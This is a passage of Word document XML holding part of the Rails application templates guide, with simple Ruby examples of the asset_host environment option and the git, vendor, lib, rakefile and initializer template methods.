      <w:tblGrid>
        <w:gridCol w:w="5087"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="06FFCCC5" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47C8ABB9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>application do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7870BE1B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "config.asset_host = '</w:t>
            </w:r>
            <w:hyperlink r:id="rId1162" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://example.com</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="183A1336" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E5F665A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Available options are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CE65ACB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="370"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:env</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Specify an environment for this configuration option. If you wish to use this option with the block syntax the recommended syntax is as follows:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5192"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="6AD223B9" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C35FE41" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>application(nil, :env</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "development") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E67DBA7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "config.asset_host = '</w:t>
            </w:r>
            <w:hyperlink r:id="rId1163" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://localhost:3000</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>'"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71627FEA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1AB169D1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>git</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23354946" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Runs the specified git command:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5375"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="7E4D87CF" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E48CDCF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>git :init</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A0C4DB2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>git :add</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "."</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="250D9B27" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>git :commit</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "-m First commit!"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1605F9D1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>git :add</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "onefile.rb", :rm</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "badfile.cxx"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F601BF0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The values of the hash here being the arguments or options passed to the specific git command. As per the final example shown here, multiple git commands can be specified at a time, but the order of their running is not guaranteed to be the same as the order that they were specified in.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251CBD40" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>vendor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A950BDA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Places a file into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>vendor</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which contains the specified code.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="1B0F6CB6" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22F48E9A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="859470292"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>vendor("sekrit.rb", '#top secret stuff')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="39CA2F86" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method also takes a block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="501612E7" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C8E045E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>vendor("seeds.rb") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F4A5814" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  "puts 'in ur app, seeding ur database'"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3221A725" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="79E0074C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2284F795" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Places a file into </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which contains the specified code.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="37E20365" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="621AC41A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="989362806"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>lib("special.rb", 'p Rails.root')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74A90D62" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method also takes a block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="3AB3FC79" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="147364B0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>lib("super_special.rb") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29EA5F9F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts "Super special!"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F632CA2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="25E97B96" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.8 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rakefile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0936E3DD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Creates a Rake file in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/tasks</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory of the application.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="69613188" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="19D05BDF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="898977468"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rakefile("test.rake", 'hello there')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="50B61F19" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method also takes a block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4295"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="5DDC6A32" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75D3E31C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rakefile("test.rake") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CBCB1FD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  %Q{</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E052AD3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    task :rock</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :environment</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3748BA6B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      puts "Rockin'"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7C246592" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B5995EA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56D8FFDB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6BE2E0BF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D4DE65" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Creates an initializer in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory of the application:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0F9377F2" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7664AED1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1591040885"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializer("begin.rb", "puts 'this is the beginning'")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="276D47AC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method also takes a block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="78AF9B21" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
